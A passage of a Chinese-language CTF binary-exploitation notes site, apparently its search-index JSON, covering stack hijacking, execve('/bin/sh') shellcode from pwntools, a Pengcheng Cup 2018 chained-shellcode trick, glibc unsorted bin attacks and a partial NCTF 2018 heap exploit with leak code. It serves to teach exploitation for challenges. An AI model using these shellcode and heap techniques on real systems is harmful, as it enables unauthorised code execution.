\uff0c\u6765\u63a7\u5236\u6d41\u7a0b \u4f8b\u9898 pwnable.kr simple login stack hijack \u6808\u4e0a\u7684 hijack \u7684\u76ee\u7684\u5c31\u662f\u80fd\u591f hijack eip \uff0c\u800c\u63a7\u5236 eip \u53ef\u4ee5\u901a\u8fc7\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6 ebp \uff0c\u63a7\u5236 ebp \u6765\u63a7\u5236 eip","title":"stack hijack"},{"location":"pwn/stack-hijack/#stack-hijack","text":"","title":"stack hijack"},{"location":"pwn/stack-hijack/#hijack-ret","text":"\u6700\u5e38\u89c1\u7684\u5c31\u662f\uff0c\u6808\u6ea2\u51fa hijack ret","title":"hijack ret"},{"location":"pwn/stack-hijack/#hijack-ebp","text":"\u6709\u7684\u65f6\u5019\uff0c\u65e0\u6cd5\u6808\u6ea2\u51fa\u5230 ret \uff0c\u65e0\u6cd5\u76f4\u63a5 hijack \u4e0a ret addr \uff0c\u4f46\u662f\u53ef\u4ee5 hijack ebp \uff0c\u7531\u4e8e x86 \u67b6\u6784\u7684\u539f\u56e0\uff0c\u5728\u51fd\u6570\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u4f1a\u901a\u8fc7\u673a\u5236\uff0c\u5c06 ebp+0x4(\u6216 rbp+0x8 ) \u8ba4\u4e3a\u6210 ret addr \uff0c\u56e0\u6b64\u5c31\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u5230 ebp \uff0c\u6765\u63a7\u5236\u6d41\u7a0b \u4f8b\u9898 pwnable.kr simple login","title":"hijack ebp"},{"location":"pwn/stack-hijack/#stack-hijack_1","text":"\u6808\u4e0a\u7684 hijack \u7684\u76ee\u7684\u5c31\u662f\u80fd\u591f hijack eip \uff0c\u800c\u63a7\u5236 eip \u53ef\u4ee5\u901a\u8fc7\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6 ebp \uff0c\u63a7\u5236 ebp \u6765\u63a7\u5236 eip","title":"stack hijack"},{"location":"pwn/syscall/","text":"syscall syscall \u7cfb\u7edf\u8c03\u7528\u53f7\u5bf9\u5e94\u7684\u8868 syscall64 syscall32 32\u4f4d 64\u4f4d getshell \u6c47\u7f16\u4ee3\u7801 32 \u4f4d context.arch = i386 print(shellcraft.execve( /bin/sh )) /* execve(path= /bin/sh , argv=0, envp=0) */ /* push /bin/sh\\x00 */ push 0x1010101 xor dword ptr [esp], 0x169722e push 0x6e69622f mov ebx, esp xor ecx, ecx xor edx, edx /* call execve() */ push SYS_execve /* 0xb */ pop eax int 0x80 eax = 0xb ebx = addr(\"/bin/sh\") ecx = 0 edx = 0 64 \u4f4d context.arch = amd64 print(shellcraft.execve( /bin/sh )) /* execve(path= /bin/sh , argv=0, envp=0) */ /* push /bin/sh\\x00 */ mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x68732f6e69622f xor [rsp], rax mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall rax = 0x3b rdi = addr(\"/bin/sh\") rdx = 0 rsi = 0 \u7cfb\u7edf\u8c03\u7528\u65f6\u66f4\u6539\u7684\u5bc4\u5b58\u5668 IF (CS.L \u2260 1 ) or (IA32_EFER.LMA \u2260 1) or (IA32_EFER.SCE \u2260 1) (* Not in 64-Bit Mode or SYSCALL/SYSRET not enabled in IA32_EFER *) THEN #UD; FI; RCX \u2190 RIP; (* Will contain address of next instruction *) RIP \u2190 IA32_LSTAR; R11 \u2190 RFLAGS; RFLAGS \u2190 RFLAGS AND NOT(IA32_FMASK); CS.Selector \u2190 IA32_STAR[47:32] AND FFFCH (* Operating system provides CS; RPL forced to 0 *) (* Set rest of CS to a fixed value *) CS.Base \u2190 0; (* Flat segment *) CS.Limit \u2190 FFFFFH; (* With 4-KByte granularity, implies a 4-GByte limit *) CS.Type \u2190 11; (* Execute/read code, accessed *) CS.S \u2190 1; CS.DPL \u2190 0; CS.P \u2190 1; CS.L \u2190 1; (* Entry is to 64-bit mode *) CS.D \u2190 0; (* Required if CS.L = 1 *) CS.G \u2190 1; (* 4-KByte granularity *) CPL \u2190 0; SS.Selector \u2190 IA32_STAR[47:32] + 8; (* SS just above CS *) (* Set rest of SS to a fixed value *) SS.Base \u2190 0; (* Flat segment *) SS.Limit \u2190 FFFFFH; (* With 4-KByte granularity, implies a 4-GByte limit *) SS.Type \u2190 3; (* Read/write data, accessed *) SS.S \u2190 1; SS.DPL \u2190 0; SS.P \u2190 1; SS.B \u2190 1; (* 32-bit stack segment *) SS.G \u2190 1; (* 4-KByte granularity *) \u503c\u5f97\u6ce8\u610f\u7684\u662f syscall \u4f1a\u7528 rcx \u8bb0\u5f55\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u503c\uff0c\u5982\u679c\u7a0b\u5e8f\u5141\u8bb8\u4f60\u7684\u8f93\u5165\u5728\u4e00\u4e2a rwxp \u6bb5\uff0c\u4f46\u662f\u6bcf\u6b21\u8f93\u5165\u5341\u5206\u77ed\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7 syscall \u627e\u5230\u5f53\u524d\u5199\u5165\u7684\u5730\u5740\u8fdb\u884c\u7eed\u5199 \u9e4f\u7a0b\u676f 2018 \u7684 note note \u4e2d got \u8868\u7684\u90e8\u5206 rwxp\uff0cheap \u4e5f\u4e3a rwxp \uff0c\u82e5\u5c06 got \u8868\u7684\u67d0\u4e00\u9879\u8986\u76d6\u6210\u6307\u5411 shellcode \u7684 \u6307\u9488\uff0c\u5373\u53ef getshell \u6f0f\u6d1e\u5728\u4e8e\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u8986\u76d6 Array \u7684 idx \uff0c\u8fdb\u800c\u4e0b\u6ea2\u6570\u7ec4\uff0c\u8986\u76d6 got \u8868\u67d0\u4e00\u9879\u6210 chunk \u7684\u5730\u5740\uff0c\u5728\u8c03\u7528\u8be5 got \u7684\u65f6\u5019\uff0c\u8df3\u8f6c\u5230 heap \u4e0a\u7684 shellcode \u8fd0\u884c\u6c47\u7f16\u4ee3\u7801 \u6b64\u9898\u9650\u5236\u6bcf\u6b21\u7684\u5199\u5230 heap \u4e0a\u7684\u957f\u5ea6\u5c0f\u4e8e 13 \uff0c\u56e0\u6b64\u4e00\u79cd\u529e\u6cd5\u662f\u5c06\u591a\u4e2a heap \u4e0a\u7684 shellcode \u901a\u8fc7 asm(\"jmp addr\") \u62fc\u63a5\u8d77\u6765 (\"\\xEB\" \u662f jmp (-127 ~ +128) \u7684\u673a\u5668\u7801\uff0c\u901a\u8fc7 gdb \u6216\u8005 \u624b\u63a8\u4e5f\u80fd\u5f97\u5230 \"\\xEB\\x??\" \u7684\u503c) \u8fd9\u91cc\u60f3\u91cd\u70b9\u4ecb\u7ecd\u4e00\u4e0b Whitzard \u7684\u505a\u6cd5\uff0c\u5f88\u5de7\u5999\u8fd0\u7528 syscall \uff0c \u4ee5\u4e0b\u4e3a Whitezard \u7684\u5173\u952e\u6c47\u7f16\u4ee3\u7801 start : xor rax, rax syscall dec edx mov rsi, rcx jmp start \u6700\u5f00\u59cb\u7684\u65f6\u5019\u7531\u4e8e\u8f93\u5165\u9650\u5236\u53ea\u80fd 13 byte\uff0c\u56e0\u6b64\u63a7\u5236\u4e0d\u4e86 rsi\uff0c\u4e0d\u80fd read \u5230\u81ea\u5df1\u60f3\u8981\u7684\u5730\u65b9\uff0c\u5e76\u4e14\u4e0d\u80fd\u4ece\u73b0\u6709\u7684\u6c47\u7f16\u4ee3\u7801\u8df3\u8f6c\u8fc7\u53bb\u3002\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 syscall \u627e\u5230\u4e4b\u524d\u5199\u5165\u7684\u5730\u5740\uff0c\u8fd0\u7528 edx \u53ea\u53d6 rdx \u7684\u4f4e 32 \u4f4d\uff0cjmp (-127 ~ +128) \u7684\u503c\u8fdb\u884c\u8c03\u7528 SYS_read\uff0c \u5c06 shellcode \u7eed\u5199\u5728 syscall \u540e\u9762\uff0c\u4ece\u800c getshell Syscall Operation","title":"syscall"},{"location":"pwn/syscall/#syscall","text":"","title":"syscall"},{"location":"pwn/syscall/#syscall_1","text":"","title":"syscall"},{"location":"pwn/syscall/#_1","text":"syscall64 syscall32","title":"\u7cfb\u7edf\u8c03\u7528\u53f7\u5bf9\u5e94\u7684\u8868"},{"location":"pwn/syscall/#32-64-getshell","text":"","title":"32\u4f4d 64\u4f4d getshell \u6c47\u7f16\u4ee3\u7801"},{"location":"pwn/syscall/#32","text":"context.arch = i386 print(shellcraft.execve( /bin/sh )) /* execve(path= /bin/sh , argv=0, envp=0) */ /* push /bin/sh\\x00 */ push 0x1010101 xor dword ptr [esp], 0x169722e push 0x6e69622f mov ebx, esp xor ecx, ecx xor edx, edx /* call execve() */ push SYS_execve /* 0xb */ pop eax int 0x80 eax = 0xb ebx = addr(\"/bin/sh\") ecx = 0 edx = 0","title":"32 \u4f4d"},{"location":"pwn/syscall/#64","text":"context.arch = amd64 print(shellcraft.execve( /bin/sh )) /* execve(path= /bin/sh , argv=0, envp=0) */ /* push /bin/sh\\x00 */ mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x68732f6e69622f xor [rsp], rax mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ /* call execve() */ push SYS_execve /* 0x3b */ pop rax syscall rax = 0x3b rdi = addr(\"/bin/sh\") rdx = 0 rsi = 0","title":"64 \u4f4d"},{"location":"pwn/syscall/#_2","text":"IF (CS.L \u2260 1 ) or (IA32_EFER.LMA \u2260 1) or (IA32_EFER.SCE \u2260 1) (* Not in 64-Bit Mode or SYSCALL/SYSRET not enabled in IA32_EFER *) THEN #UD; FI; RCX \u2190 RIP; (* Will contain address of next instruction *) RIP \u2190 IA32_LSTAR; R11 \u2190 RFLAGS; RFLAGS \u2190 RFLAGS AND NOT(IA32_FMASK); CS.Selector \u2190 IA32_STAR[47:32] AND FFFCH (* Operating system provides CS; RPL forced to 0 *) (* Set rest of CS to a fixed value *) CS.Base \u2190 0; (* Flat segment *) CS.Limit \u2190 FFFFFH; (* With 4-KByte granularity, implies a 4-GByte limit *) CS.Type \u2190 11; (* Execute/read code, accessed *) CS.S \u2190 1; CS.DPL \u2190 0; CS.P \u2190 1; CS.L \u2190 1; (* Entry is to 64-bit mode *) CS.D \u2190 0; (* Required if CS.L = 1 *) CS.G \u2190 1; (* 4-KByte granularity *) CPL \u2190 0; SS.Selector \u2190 IA32_STAR[47:32] + 8; (* SS just above CS *) (* Set rest of SS to a fixed value *) SS.Base \u2190 0; (* Flat segment *) SS.Limit \u2190 FFFFFH; (* With 4-KByte granularity, implies a 4-GByte limit *) SS.Type \u2190 3; (* Read/write data, accessed *) SS.S \u2190 1; SS.DPL \u2190 0; SS.P \u2190 1; SS.B \u2190 1; (* 32-bit stack segment *) SS.G \u2190 1; (* 4-KByte granularity *) \u503c\u5f97\u6ce8\u610f\u7684\u662f syscall \u4f1a\u7528 rcx \u8bb0\u5f55\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u503c\uff0c\u5982\u679c\u7a0b\u5e8f\u5141\u8bb8\u4f60\u7684\u8f93\u5165\u5728\u4e00\u4e2a rwxp \u6bb5\uff0c\u4f46\u662f\u6bcf\u6b21\u8f93\u5165\u5341\u5206\u77ed\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u901a\u8fc7 syscall \u627e\u5230\u5f53\u524d\u5199\u5165\u7684\u5730\u5740\u8fdb\u884c\u7eed\u5199","title":"\u7cfb\u7edf\u8c03\u7528\u65f6\u66f4\u6539\u7684\u5bc4\u5b58\u5668"},{"location":"pwn/syscall/#2018-note","text":"note \u4e2d got \u8868\u7684\u90e8\u5206 rwxp\uff0cheap \u4e5f\u4e3a rwxp \uff0c\u82e5\u5c06 got \u8868\u7684\u67d0\u4e00\u9879\u8986\u76d6\u6210\u6307\u5411 shellcode \u7684 \u6307\u9488\uff0c\u5373\u53ef getshell \u6f0f\u6d1e\u5728\u4e8e\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u8986\u76d6 Array \u7684 idx \uff0c\u8fdb\u800c\u4e0b\u6ea2\u6570\u7ec4\uff0c\u8986\u76d6 got \u8868\u67d0\u4e00\u9879\u6210 chunk \u7684\u5730\u5740\uff0c\u5728\u8c03\u7528\u8be5 got \u7684\u65f6\u5019\uff0c\u8df3\u8f6c\u5230 heap \u4e0a\u7684 shellcode \u8fd0\u884c\u6c47\u7f16\u4ee3\u7801 \u6b64\u9898\u9650\u5236\u6bcf\u6b21\u7684\u5199\u5230 heap \u4e0a\u7684\u957f\u5ea6\u5c0f\u4e8e 13 \uff0c\u56e0\u6b64\u4e00\u79cd\u529e\u6cd5\u662f\u5c06\u591a\u4e2a heap \u4e0a\u7684 shellcode \u901a\u8fc7 asm(\"jmp addr\") \u62fc\u63a5\u8d77\u6765 (\"\\xEB\" \u662f jmp (-127 ~ +128) \u7684\u673a\u5668\u7801\uff0c\u901a\u8fc7 gdb \u6216\u8005 \u624b\u63a8\u4e5f\u80fd\u5f97\u5230 \"\\xEB\\x??\" \u7684\u503c) \u8fd9\u91cc\u60f3\u91cd\u70b9\u4ecb\u7ecd\u4e00\u4e0b Whitzard \u7684\u505a\u6cd5\uff0c\u5f88\u5de7\u5999\u8fd0\u7528 syscall \uff0c \u4ee5\u4e0b\u4e3a Whitezard \u7684\u5173\u952e\u6c47\u7f16\u4ee3\u7801 start : xor rax, rax syscall dec edx mov rsi, rcx jmp start \u6700\u5f00\u59cb\u7684\u65f6\u5019\u7531\u4e8e\u8f93\u5165\u9650\u5236\u53ea\u80fd 13 byte\uff0c\u56e0\u6b64\u63a7\u5236\u4e0d\u4e86 rsi\uff0c\u4e0d\u80fd read \u5230\u81ea\u5df1\u60f3\u8981\u7684\u5730\u65b9\uff0c\u5e76\u4e14\u4e0d\u80fd\u4ece\u73b0\u6709\u7684\u6c47\u7f16\u4ee3\u7801\u8df3\u8f6c\u8fc7\u53bb\u3002\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 syscall \u627e\u5230\u4e4b\u524d\u5199\u5165\u7684\u5730\u5740\uff0c\u8fd0\u7528 edx \u53ea\u53d6 rdx \u7684\u4f4e 32 \u4f4d\uff0cjmp (-127 ~ +128) \u7684\u503c\u8fdb\u884c\u8c03\u7528 SYS_read\uff0c \u5c06 shellcode \u7eed\u5199\u5728 syscall \u540e\u9762\uff0c\u4ece\u800c getshell Syscall Operation","title":"\u9e4f\u7a0b\u676f 2018 \u7684 note"},{"location":"pwn/unsorted-bin/","text":"Unsorted bin malloc static void * _int_malloc (mstate av, size_t bytes) // mstate \u4e3a main_arena \u7ed3\u6784\u4f53 { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ // Covert request size to normalized request size checksed_request2size(bytes, nb); ... for(;;) { int iters = 0; while ((victim = unsorted_chunks (av)- bk) != unsorted_chunks(av)) // unsorted_chunk (av) \u4e3a main arena + 88 \u5373 main arena \u4e2d\u5b58\u50a8 unsorted bin fd bk \u7684\u5730\u65b9 { bck = victim- bk; // victim \u4e3a\u5c06\u88ab\u4ece unsorted bin \u94fe\u4e0a\u53d6\u4e0b\u6765\u7684\u90a3\u4e00\u5757 size = chunksize(victim); mchunkptr next = chunk_at_offset (victim, size); ... / * glibc2.27 add the check glibc2.23 doesn t have this check if (__glibc_unlikely (bck- fd != victim) || __glibc_unlikely (victim- fd != unsorted_chunks (av))) malloc_printerr ( mallloc(): unsorted double linked list corrupted ); if (__libc_unlikely (prev_inuse (next))) malloc_printerr ( malloc(): invalid next- prev_inuse (unsorted) ); */ // if a small request , try to ues last remainder if it is the only chunk in unosrted bin. if (in_samllbin_range (nb) bck == unsorted_chunks (av) victim == av- last_remainder (unsigned long) (size) (unsigned long) (nb + MINSIZE)) {...} /* remove from unsorted list */ if (__glibc_unlikely (bck- fd != victim)) malloc_printerr( malloc(): corrupted unsorted chunks 3 ); unsorted_chunks (av)- bk = bck; bck- fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ // because size fits ,so after setting some values or checking some values, it returns p if (size == nb) { ... return p; } /* place chunk in bin */ if (in_samllbin_range (size)) { victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck- fd; } else { victim_index = largenbin_index(size); bck = bin_at (av, victim_index); fwd = bck- fd; /* maintain large bins in sorted order */ if (fwd != bck) {...} else {...} } mark_bin(av, victim_index); victim- bk = bck; victim- fd = fwd; fwd- bk = victim; bck- fd = victim; #define MAX_ITERS 10000 if (iters = MAX_ITERS) break; } /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ if (!in_smallbin_range(nb)) {...} else {...} ... use top : ... ... } } \u4e0a\u8ff0\u4ee3\u7801\u4e2d // \u6ce8\u91ca\u7684\u4e3a\u7b14\u8005\u52a0\u7684\u6ce8\u91ca\uff0c/* */ \u4e3a\u4ee3\u7801\u4e2d\u539f\u751f\u6ce8\u91ca\uff0c\u82f1\u6587\u5199\u7684 // \u4e3a\u7b14\u8005\u4e3a\u4fbf\u4e8e\u7406\u89e3 unsorted bin \u7684\u5927\u6846\u67b6\u7b80\u5199\u4e86\u4ee3\u7801\u4e2d\u539f\u751f\u6ce8\u91ca \u5728\u7b14\u8005\u770b\u6765\uff0cunsorted bin \u4e2d\u53d6\u4e0b victim \u90a3\u4e00\u5757\u65f6 \uff0cvictim \u7684 bk \u53ef\u4ee5\u79f0\u5f97\u4e0a\u662f unsorted bin malloc \u7684\u53d1\u8d77\u70b9\uff0c\u76f8\u53cd victim \u7684 fd \u751a\u81f3\u57fa\u672c\u6beb\u65e0\u63d0\u53ca\u3002\u5728\u68c0\u6d4b\u5f88\u5c11\u7684 unsorted bin \u7684 malloc \uff0c\u5982\u679c\u80fd\u4fee\u6539 free \u6389\u7684 unsorted bin \u7684 bk\uff0c\u5c06 unsorted bin \u7684 bk \u6539\u6210 \u76ee\u6807\u5730\u5740-0x10\uff0c\u90a3\u4e48\u5c31\u80fd\u5728 fake_bk+0x10 \u7684\u5730\u5740\u4e0a\u5199\u4e0a (main arena+88) \u7684\u503c\uff0c\u6bd4\u5982\u5c06 global_max_fast \u7684\u503c\u6539\u5927\uff0c\u5219\u4e4b\u540e\u7684 chunk \u7684 malloc \u548c free \u7686\u53d8\u6210\u4e86 fastbin \u7684 malloc \u548c free\uff0c\u4f46\u662f unsorted bin \u7684\u673a\u5236\u57fa\u672c\u53ef\u4ee5\u8bf4\u662f\u5e9f\u6389\u4e86\uff0c\u518d\u4f7f\u7528\u4fbf\u4f1a crash\u3002 \u4e3b\u6d41\u7684\u4e24\u79cd unsorted bin attack \uff0c\u4e00\u79cd\u662f\u66f4\u6539 global_max_fast \u53e6\u4e00\u79cd\u662f house of orange \u4e2d\u66f4\u6539 _IO_list_all (\u8fd9\u4e2a\u6211\u8fd8\u6ca1\u641e\u61c2\uff0c\u7559\u5751=.=) \u5b66\u957f\u8bf4\u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u5178\u578b\u7684 attack , house of roman \u4e5f\u662f\u7528\u7684\u8fd9\u4e2a\u529e\u6cd5\uff0c\u7565\u5fae\u770b\u4e86\u4e00\u4e0b\uff0c\u57fa\u672c\u601d\u60f3\u5c31\u662f\uff0c\u80fd\u591f\u5c06 main_arena+88 \u5199\u5165 __malloc_hook \u7136\u540e\u8fdb\u884c\u66f4\u6539\u540e3\u4e2a\u5b57\u8282\uff0c\u89e6\u53d1 malloc_printerr \u4ece\u800c getshell (\u7559\u5751) free __int_free (mstate av, mchunkptr p, int have_lock) { INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ ... if (nextchunk != av- top) { ... /* Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc. */ bck = unsorted_chunks(av); fwd = bck- fd; if (__glibc_unlikely (fwd- bk != bck)) malloc_printerr ( free(): corrupted unsorted chunks ); p- fd = fwd; p- bk = bck; if (!in_smallbin_range(size)) { p- fd_nextsize = NULL; p- bk_nextsize = NULL; } bck- fd = p; fwd- bk = p; ... } ... } unsorted bin \u7684 free \u5c31\u6734\u5b9e\u5f88\u591a\uff0c\u8ddf\u6b63\u5e38\u7684\u53cc\u5411\u94fe\u8868\u6ca1\u4ec0\u4e48\u533a\u522b\u3002 2018 NCTF houseofhomura \u524d\u8a00 \u8fd9\u4e2a\u9898\u76ee\u662f glibc2.23 \uff0c\u5728 glibc2.23 \u4e2d\u8fde check(victim- bk- fd == victim) \u90fd\u6ca1\uff0c\u800c\u6bcf\u6b21\u5c06\u94fe\u8868\u4e2d chunk \u62ff\u51fa\u6765\u4e4b\u540e\uff0c\u662f\u7528 unsorted_bins(av)- bk \u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5373\u4f7f\u53cc\u5411\u94fe\u8868\u4e2d fd \u9664 unsorted_bins(av)- fd \u4ee5\u5916\u90fd\u662f\u9519\u8bef\u7684\uff0c\u5982\u679c unsorted_bins(av)- bk \u7684 fd \u662f\u6307\u5411 main_arena+88 \u7684\u4f4d\u7f6e\u7684\uff0c\u904d\u5386 unsorted bins \u7684\u53cc\u5411\u94fe\u8868\u65f6\uff0cvictim- bk- fd \u6bcf\u6b21\u90fd\u662f\u88ab\u52a8\u88ab\u8d4b\u503c\u6210 unsorted_bins(av)- fd \uff0c\u56e0\u6b64\u4e00\u5c42\u4e00\u5c42\u904d\u5386\u4e0b\u6765\uff0c fd \u90fd\u4f1a\u88ab\u8d4b\u503c\u6210\u76f8\u540c\u7684\u503c \uff08\u867d\u7136\u6211\u8fd8\u662f\u60f3\u9ed8\u9ed8\u5410\u69fd\u4e00\u4e0b\uff0cNCTF 2018 \u8fd9\u9898\u5b98\u65b9 exp \u5199\u7684\u6beb\u65e0\u6ce8\u89e3\uff0c\u4f46\u662f\u8fd8\u662f\u5f88\u5de7\u5999\u7684\uff0c\u8fd9\u4e00\u9898 unsorted bin \u7684\u653b\u51fb\u65b9\u5f0f\uff0c\u786e\u5b9e\u5728 Google \u4e2d\u6ca1\u6709\u641c\u51fa\u6765[\u641c\u5230\u6700\u540e\uff0c\u518d\u641c\u7684\u65f6\u5019\uff0cGoogle \u4e00\u4e2a\u7248\u9762\u90fd\u663e\u793a\u4f60\u5168\u770b\u8fc7]\uff0c\u4e0d\u5f97\u5df2\u6700\u540e\u53bb\u8c03\u8bd5\u4e86\u4e00\u53d1\u5b98\u65b9 exp [\u6700\u540e\u611f\u89c9\u5b98\u65b9 exp \u8fd8\u662f\u5199\u590d\u6742\u4e86\uff0c\u4e0d\u8fc7\u5df2\u7ecf\u5f88\u826f\u5fc3\u4e86\uff0c\u4e00\u4e9b\u6bd4\u8d5b\u8fde exp \u90fd\u6ca1]\uff09 \u529f\u80fd add() \u6bcf\u4e00\u6b21 add() \u90fd\u4f1a\u4ea7\u751f\u4e09\u4e2a chunk \u5148 malloc(0x10) \u7528\u6765\u7ba1\u7406\u4e4b\u540e malloc \u7684\u4e24\u4e2a chunk struct P { char* name; char* message; } \u4e4b\u540e\u4e24\u4e2a chunk \u9650\u5236\u5927\u5c0f\uff0cname \u6700\u5927 malloc(0x10)\uff0cmessage \u6700\u5c0f malloc(0x80+0x10) void add() { struct P *v0; // rbx struct P *v1; // rbx signed int i; // [rsp+4h] [rbp-1Ch] int v3; // [rsp+8h] [rbp-18h] int v4; // [rsp+Ch] [rbp-14h] for ( i = 0; i = 14 Array[i]; ++i ) ; if ( i = 14 ) { Array[i] = (struct P *)malloc(0x10uLL); v0 = Array[i]; v0- name = (char *)malloc(0x10uLL); printf( length of your name: ); v3 = Atoi(); if ( v3 15 ) v3 = 16; printf( your name: ); Read(Array[i]- name, v3); printf( size of your message: , (unsigned int)v3); v4 = Atoi(); if ( v4 = 0x80 || v4 0xFFF ) v4 = 0x80; v1 = Array[i]; v1- message = (char *)malloc(v4 + 16); printf( please leave your message: ); Read(Array[i]- message, v4); puts( Done! ); } else { puts( full! ); } } delete() \u5220\u9664\u7684\u65f6\u5019\uff0c\u4f1a\u6e05\u7a7a Arrray[v0]\uff0c\u4f46\u662f\u6ca1\u6e05\u7a7a struct P \u4e2d\u4e24\u4e2a\u6307\u9488\uff08UAF\uff09 void delete() { int v0; // [rsp+Ch] [rbp-4h] printf( index: ); v0 = Atoi(); if ( v0 = 0 v0 = 14 ) { free(Array[v0]- name); free(Array[v0]- message); free(Array[v0]); Array[v0] = 0LL; puts( Done! ); } else { puts( invalid ); } } modify() \u6f0f\u6d1e\u5c31\u51fa\u5728\u8fd9\u91cc\uff0c\u552f\u4e00\u53ef\u4ee5\u6253\u5370\u7684\u5730\u65b9\uff0c\u4ee5\u53ca\u552f\u4e00\u53ef\u4ee5\u4fee\u6539\u7684\u5730\u65b9\uff08\u5176\u5b9e\u4e0d\u662f\u552f\u4e00\u53ef\u4ee5\u4fee\u6539\u7684\u5730\u65b9\uff09 \u53ef\u4ee5\u60f3\u5230\uff0c\u5982\u679c\u5728 delete() \u4e4b\u524d modify() \u4e86\uff0c\u90a3\u4e48\u8be5 struct P \u6307\u9488\u5c31\u4f1a\u88ab\u8bb0\u5f55\u5728 qword_2020E0 \u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u53c8\u56e0\u4e3a delete \u4e4b\u540e\u53ef\u4ee5 UAF\uff0c\u6240\u4ee5\u80fd\u66f4\u6539\u88ab free \u4e4b\u540e message \u90a3\u4e00\u5757\u7684\u503c\uff0c\u540c\u6837\u56e0\u4e3a UAF\uff0c\u5373\u5c06\u88ab malloc \u5757\u7684\uff08\u4e0d\u5305\u542b\u5934\u7684\uff09\u524d8\u4e2a\u5b57\u8282\u4e0a\u9762\u6709\u503c\uff0c\u5373\u539f\u6765\u6b8b\u7559\u7684 fd \uff0c\u7136\u540e\u5728 add \u7684\u65f6\u5019\uff0c\u8f93\u5165\u7a7a\uff08\"\"\uff09\u90a3\u4e48\u5c31\u80fd\u6cc4\u9732 heap base \u548c libc base \uff0c\u4e00\u4e2a\u901a\u8fc7 fastbin \u7684 fd \u6cc4\u9732\uff0c\u4e00\u4e2a\u901a\u8fc7 unsorted bin \u7684 fd \u6cc4\u9732 libc \u5bf9\u4e8e\u88ab free \u6389\u7684 unsorted bin \u53ef\u4ee5\u66f4\u6539 fd bk \u5f62\u6210 fake unsorted bin \u94fe void modify() { int v0; // [rsp+8h] [rbp-18h] int v1; // [rsp+Ch] [rbp-14h] printf( index: ); v1 = Atoi(); if ( v1 = 0 v1 = 14 ) { if ( Array[v1] ) qword_2020E0 = Array[v1]; if ( qword_2020E0 ) { printf( size: ); v0 = Atoi(); if ( v0 strlen(qword_2020E0- message) ) v0 = 16; printf( Hello %s you can modify your message , qword_2020E0- name); Read(qword_2020E0- message, v0); puts( Done! ); } } else { puts( invalid ); } } edit_len_0 modify \u8ddf edit_len_0 \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\uff0cmodify \u6839\u636e strlen(message) \u518d\u6b21\u8f93\u5165\uff0c\u800c edit_len_0 \u53ef\u4ee5\u5728 len = 0 \u65f6\uff0c\u8fdb\u884c\u590d\u5199 void edit_len_0() { int v0; // [rsp+Ch] [rbp-34h] char s; // [rsp+10h] [rbp-30h] __int64 v2; // [rsp+28h] [rbp-18h] unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); if ( vuln_argv == 0xDEADBEEF ) { vuln_argv = 0; printf( index: ); v0 = Atoi(); if ( v0 = 0 v0 = 14 ) { if ( Array[v0] ) qword_2020E0 = Array[v0]; if ( qword_2020E0 ) { printf( modify your message ); memset( s, 0, 0x28uLL); Read( s, 8u); printf( Here you can modify once again! , 8LL); Read((char *) v2, 8u); memcpy(qword_2020E0- message, s, 0x20uLL); puts( Done! ); } } else { puts( invalid ); } } } \u5206\u6790 leak heap libc add() \u4e09\u6b21 chunk : 0x20 0x20 0xa0 | 0x20 0x20 0xa0 | 0x20 0x20 0xa0 \u7136\u540e delete(1) delete(0) \u518d add() \u7684\u65f6\u5019\uff0cname = \"\" \u901a\u8fc7 modify() \u6253\u5370\uff0c\u6cc4\u9732\u51fa heap base libc \u5219\u901a\u8fc7\u5148 add() \u4e00\u4e2a\u5927\u5757\uff0c\u7136\u540e delete() \u4e4b\u540e\uff0cadd() \u5c0f\u5757\uff0c\u5c0f\u5757\u4f1a\u5207\u5206\u5927\u5757 unsorted bin \uff0c\u4ece\u800c leak libc log.info( leak heap ) add(0x10, A *0xF, 0x80, a *0x20) # 0 add(0x10, B *0xF, 0x80, b *0x20) # 1 add(0x10, C *0xF, 0x80, c *0x20) # 2 modify(0, 0x21, a *0x20) delete(1) delete(0) add(0, , 0, ) heap_base = leak(0, 0, ) - 0xe0 success( heap , heap_base) pause() log.info( leak libc ) add(0x10, D *0xF, 0x80, d *0x20) # 1 